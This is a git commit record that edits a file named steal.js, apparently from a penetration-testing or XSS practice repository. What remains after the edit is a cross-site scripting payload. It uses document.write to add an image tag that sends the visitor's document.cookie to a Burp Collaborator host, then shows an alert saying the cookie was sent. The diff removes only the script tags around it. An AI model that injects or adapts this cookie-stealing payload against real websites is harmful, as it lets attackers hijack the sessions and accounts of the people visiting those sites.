649a61093c7f2768e710b6ffd3863875057a7855
tstaeg <57662024+tstaeg@users.noreply.github.com>
2020-06-25 13:18:13 +0200

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,4 +1,2 @@
-<script>
 document.write("<img src='http://a3egucu8gk0d98yvoxa5j995vw1tpi.burpcollaborator.net/becrop?cookie="+escape(document.cookie)+"'/>");
 alert("Cookien sent: "+document.cookie);
-</script>
